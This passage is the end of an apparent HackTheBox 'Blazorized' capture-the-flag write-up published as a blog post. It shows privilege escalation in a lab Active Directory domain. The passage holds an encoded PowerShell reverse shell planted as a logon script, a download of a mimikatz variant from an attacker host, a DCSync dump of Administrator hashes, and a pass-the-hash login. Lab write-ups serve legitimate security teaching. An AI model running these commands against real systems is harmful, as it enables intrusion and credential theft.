PM</span><br><span class="line">whencreated           : 1/10/2024 2:32:00 PM</span><br><span class="line">objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb</span><br><span class="line">dscorepropagationdata : &#123;6/19/2024 1:24:50 PM, 6/14/2024 12:40:41 PM, 6/14/2024 12:40:28 PM, 6/14/2024 12:38:20 PM...&#125;</span><br><span class="line">usnchanged            : 356866</span><br><span class="line">memberof              : &#123;CN=Super_Support_Administrators,CN=Users,DC=blazorized,DC=htb, CN=Remote Management Users,CN=Builtin,DC=blazorized,DC=htb&#125;</span><br><span class="line">lastlogon             : 11/10/2024 6:09:14 PM</span><br><span class="line">cn                    : SSA_6010</span><br><span class="line">badpwdcount           : 0</span><br><span class="line">scriptpath            : kujen</span><br><span class="line">useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD</span><br><span class="line">objectsid             : S-1-5-21-2039403211-964143010-2924010611-1124</span><br><span class="line">primarygroupid        : 513</span><br><span class="line">pwdlastset            : 2/25/2024 11:56:55 AM</span><br><span class="line">name                  : SSA_6010</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Something that was weird to me is that bat script files you put in any directory different than <code>C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\</code> will not work. But turns out the service will check the scripts folder and appent the scriptpath variable to it.<br>Checking that directory I find that “A32FF3AEAA23” folder is writeable. So let’s use it:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Windows\SYSVOL\domain\scripts&gt; icacls A32FF3AEAA23</span><br><span class="line">A32FF3AEAA23 BLAZORIZED\RSA_4810:(OI)(CI)(F)</span><br><span class="line">             BLAZORIZED\Administrator:(OI)(CI)(F)</span><br><span class="line">             BUILTIN\Administrators:(I)(F)</span><br><span class="line">             CREATOR OWNER:(I)(OI)(CI)(IO)(F)</span><br><span class="line">             NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(RX)</span><br><span class="line">             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)</span><br><span class="line">             BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)</span><br><span class="line">             BUILTIN\Server Operators:(I)(OI)(CI)(RX)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br><span class="line">*Evil-WinRM* PS C:\Windows\SYSVOL\domain\scripts&gt; <span class="built_in">cd</span> A32FF3AEAA23</span><br><span class="line">*Evil-WinRM* PS C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23&gt; <span class="built_in">echo</span> <span class="string">&#x27;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANAAzACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&#x27;</span> | Out-FIle -FIlePath kujen.bat -Encoding ASCII</span><br><span class="line">*Evil-WinRM* PS C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23&gt; Set-DomainObject -Identity SSA_6010 -SET @&#123;scriptpath=<span class="string">&#x27;A32FF3AEAA23\kujen.bat&#x27;</span>&#125;</span><br><span class="line">*Evil-WinRM* PS C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And we got a shell:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nc <span class="literal">-lvnp</span> <span class="number">9001</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">9001</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.x.x</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.23.80</span>] <span class="number">52900</span></span><br><span class="line">whoami</span><br><span class="line">blazorized\ssa_6010</span><br><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Pivoting-to-Administrator-DCSync"><a href="#Pivoting-to-Administrator-DCSync" class="headerlink" title="Pivoting to Administrator - DCSync"></a>Pivoting to Administrator - DCSync</h4><p>We can see that our current user is part of a “Super_Support_Administrators” group:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; whoami /all</span><br><span class="line"></span><br><span class="line">USER INFORMATION</span><br><span class="line"><span class="literal">----------------</span></span><br><span class="line"></span><br><span class="line">User Name           SID</span><br><span class="line">=================== =============================================</span><br><span class="line">blazorized\ssa_6010 S<span class="literal">-1-5-21-2039403211-964143010-2924010611-1124</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">GROUP</span> INFORMATION</span><br><span class="line"><span class="literal">-----------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Group</span> Name                                 <span class="built_in">Type</span>             SID                                           Attributes</span><br><span class="line"></span><br><span class="line">========================================== ================ ============================================= ==================================================</span><br><span class="line">Everyone                                   Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1-1-0</span>                                       Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">BUILTIN\Remote Management Users            Alias            S<span class="literal">-1-5-32-580</span>                                  Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">BUILTIN\Users                              Alias            S<span class="literal">-1-5-32-545</span>                                  Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">BUILTIN\Pre<span class="literal">-Windows</span> <span class="number">2000</span> Compatible Access Alias            S<span class="literal">-1-5-32-554</span>                                  <span class="built_in">Group</span> used <span class="keyword">for</span> deny only</span><br><span class="line">NT AUTHORITY\INTERACTIVE                   Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1-5-4</span>                                       Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">CONSOLE LOGON                              Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1-2-1</span>                                       Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">NT AUTHORITY\Authenticated Users           Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1-5-11</span>                                      Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">NT AUTHORITY\This Organization             Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1-5-15</span>                                      Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">LOCAL                                      Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1-2-0</span>                                       Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">BLAZORIZED\Super_Support_Administrators    <span class="built_in">Group</span>            S<span class="literal">-1-5-21-2039403211-964143010-2924010611-1123</span> Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">Authentication authority asserted identity Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1-18-1</span>                                      Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">Mandatory Label\Medium Mandatory Level     Label            S<span class="literal">-1-16-8192</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Checking our BloodHound results, we can see that we can perform DCSync:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Blazorized/dcsync.png"
+                      alt="DCSync"
+                ><figcaption>DCSync</figcaption></figure></p>
+<p>So let’s do it and finish this box:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\ssa_6010\documents&gt; <span class="built_in">iwr</span> <span class="number">10.10</span>.x.x/BetterSafetyKatz.exe <span class="literal">-outfile</span> s.exe</span><br><span class="line">[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9</span><br><span class="line">[+] Randomizing strings <span class="keyword">in</span> memory</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping ADVAPI32.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping Cabinet.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping CRYPT32.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping cryptdll.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping DNSAPI.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping FLTLIB.DLL</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping MPR.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping NETAPI32.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping ODBC32.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping ole32.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping OLEAUT32.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping RPCRT4.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping SHLWAPI.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping SAMLIB.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping Secur32.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping SHELL32.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping USER32.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping USERENV.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping VERSION.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping HID.DLL</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping SETUPAPI.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping WinSCard.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping WINSTA.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping WLDAP32.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping advapi32.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping msasn1.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping ntdll.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping netapi32.dll</span><br><span class="line"></span><br><span class="line">[+] Slowly mapping KERNEL32.dll</span><br><span class="line">[+] Suicide burn before CreateThread!</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::dcsync /user:blazorized\Administrator</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;blazorized.htb&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;DC1.blazorized.htb&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;blazorized\Administrator&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : Administrator</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : Administrator</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">2</span>/<span class="number">25</span>/<span class="number">2024</span> <span class="number">11</span>:<span class="number">54</span>:<span class="number">43</span> AM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-2039403211-964143010-2924010611-500</span></span><br><span class="line">Object Relative ID   : <span class="number">500</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: f55ed1465179ba374ec1cad05b34a5f3</span><br><span class="line">    ntlm- <span class="number">0</span>: f55ed1465179ba374ec1cad05b34a5f3</span><br><span class="line">    ntlm- <span class="number">1</span>: eecc741ecf81836dcd6128f5c93313f2</span><br><span class="line">    ntlm- <span class="number">2</span>: c543bf260df887c25dd5fbacff7dcfb3</span><br><span class="line">    ntlm- <span class="number">3</span>: c6e7b0a59bf74718bce79c23708a24ff</span><br><span class="line">    ntlm- <span class="number">4</span>: fe57c7727f7c2549dd886159dff0d88a</span><br><span class="line">    ntlm- <span class="number">5</span>: b471c416c10615448c82a2cbb731efcb</span><br><span class="line">    ntlm- <span class="number">6</span>: b471c416c10615448c82a2cbb731efcb</span><br><span class="line">    ntlm- <span class="number">7</span>: aec132eaeee536a173e40572e8aad961</span><br><span class="line">    ntlm- <span class="number">8</span>: f83afb01d9b44ab9842d9c70d8d2440a</span><br><span class="line">    ntlm- <span class="number">9</span>: bdaffbfe64f1fc646a3353be1c2c3c99</span><br><span class="line">    lm  - <span class="number">0</span>: ad37753b9f78b6b98ec3bb65e5995c73</span><br><span class="line">    lm  - <span class="number">1</span>: c449777ea9b0cd7e6b96dd8c780c98f0</span><br><span class="line">    lm  - <span class="number">2</span>: ebbe34c80ab8762fa51e04bc1cd0e426</span><br><span class="line">    lm  - <span class="number">3</span>: <span class="number">471</span>ac07583666ccff8700529021e4c9f</span><br><span class="line">    lm  - <span class="number">4</span>: ab4d5d93532cf6ad37a3f0247db1162f</span><br><span class="line">    lm  - <span class="number">5</span>: ece3bdafb6211176312c1db3d723ede8</span><br><span class="line">    lm  - <span class="number">6</span>: <span class="number">1</span>ccc6a1cd3c3e26da901a8946e79a3a5</span><br><span class="line">    lm  - <span class="number">7</span>: <span class="number">8</span>b3c1950099a9d59693858c00f43edaf</span><br><span class="line">    lm  - <span class="number">8</span>: a14ac624559928405ef99077ecb497ba</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">36</span>ff197ab8f852956e4dcbbe85e38e17</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer-Keys</span> *</span><br><span class="line">    Default Salt : BLAZORIZED.HTBAdministrator</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">29</span>e501350722983735f9f22ab55139442ac5298c3bf1755061f72ef5f1391e5c</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : df4dbea7fcf2ef56722a6741439a9f81</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">310</span>e2a0438583dce</span><br><span class="line">    OldCredentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : eeb59c1fa73f43372f40f4b0c9261f30ce68e6cf0009560f7744d8871058af2c</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : db4d9e0e5cd7022242f3e03642c135a6</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">1</span>c67ef730261a198</span><br><span class="line">    OlderCredentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : bb7fcd1148a3863c9122784becf13ff7b412af7d734162ed3cb050375b1a332c</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">2</span>d9925ef94916523b24e43d1cb8396ee</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">9</span>b01158c8923ce68</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : BLAZORIZED.HTBAdministrator</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">310</span>e2a0438583dce</span><br><span class="line">    OldCredentials</span><br><span class="line">      des_cbc_md5       : <span class="number">1</span>c67ef730261a198</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:WDigest *</span><br><span class="line">    <span class="number">01</span>  <span class="number">7</span>e35fe37aac9f26cecc30390171b6dcf</span><br><span class="line">    <span class="number">02</span>  a8710c4caaab28c0f2260e7c7bd3b262</span><br><span class="line">    <span class="number">03</span>  <span class="number">81</span>eae4cf7d9dadff2073fbf2d5c60539</span><br><span class="line">    <span class="number">04</span>  <span class="number">7</span>e35fe37aac9f26cecc30390171b6dcf</span><br><span class="line">    <span class="number">05</span>  <span class="number">9</span>bc0a87fd20d42df13180a506db93bb8</span><br><span class="line">    <span class="number">06</span>  <span class="number">26</span>d42d164b0b82e89cf335e8e489bbaa</span><br><span class="line">    <span class="number">07</span>  d67d01da1b2beed8718bb6785a7a4d16</span><br><span class="line">    <span class="number">08</span>  <span class="number">7</span>f54f57e971bcb257fc44a3cd88bc0e3</span><br><span class="line">    <span class="number">09</span>  b3d2ebd83e450c6b0709d11d2d8f6aa8</span><br><span class="line">    <span class="number">10</span>  <span class="number">1957</span>f9211e71d307b388d850bdb4223f</span><br><span class="line">    <span class="number">11</span>  <span class="number">2</span>fa495bdf9572e0d1ebb98bb6e268b01</span><br><span class="line">    <span class="number">12</span>  <span class="number">7</span>f54f57e971bcb257fc44a3cd88bc0e3</span><br><span class="line">    <span class="number">13</span>  de0bba1f8bb5b81e634fbaa101dd8094</span><br><span class="line">    <span class="number">14</span>  <span class="number">2</span>d34f278e9d98e355b54bbd83c585cb5</span><br><span class="line">    <span class="number">15</span>  <span class="number">06</span>b7844e04f68620506ca4d88e51705d</span><br><span class="line">    <span class="number">16</span>  <span class="number">97</span>f5ceadabcfdfcc019dc6159f38f59e</span><br><span class="line">    <span class="number">17</span>  ed981c950601faada0a7ce1d659eba95</span><br><span class="line">    <span class="number">18</span>  cc3d2783c1321d9d2d9b9b7170784283</span><br><span class="line">    <span class="number">19</span>  <span class="number">0926</span>e682c1f46c007ba7072444a400d7</span><br><span class="line">    <span class="number">20</span>  <span class="number">1</span>c3cec6d41ec4ced43bbb8177ad6e272</span><br><span class="line">    <span class="number">21</span>  <span class="number">30</span>dcd2ebb2eda8ae4bb2344a732b88f9</span><br><span class="line">    <span class="number">22</span>  b86556a7e9baffb7faad9a153d1943c2</span><br><span class="line">    <span class="number">23</span>  c6e4401e50b8b15841988e4314fbcda2</span><br><span class="line">    <span class="number">24</span>  d64d0323ce75a4f3dcf0b77197009396</span><br><span class="line">    <span class="number">25</span>  <span class="number">4274</span>d190e7bc915d4047d1a63776bc6c</span><br><span class="line">    <span class="number">26</span>  a04215f3ea1d2839a3cdca4ae01e2703</span><br><span class="line">    <span class="number">27</span>  fff4b2817f8298f09fd45c3be4568ab1</span><br><span class="line">    <span class="number">28</span>  <span class="number">2</span>ea3a6b979470233687bd913a8234fc7</span><br><span class="line">    <span class="number">29</span>  <span class="number">73</span>d831d131d5e67459a3949ec0733723</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br><span class="line"><span class="built_in">PS</span> C:\users\ssa_6010\documents&gt;</span><br></pre></td></tr></table></figure></div>
+
+
+<p>And we got our hashes! Let’s get the root flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ evil-winrm -i blazorized.htb -u administrator -H f55ed1465179ba374ec1cad05b34a5f3</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">type</span> ../desktop/root.txt</span><br><span class="line">8d9bf98c709ea4******************</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>That was it for this box, hope you enjoyed it!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Blazorized</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2024-11-08 20:09:27</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-11-11 01:30:45
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2024/11/08/Hackthebox-Blazorized/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
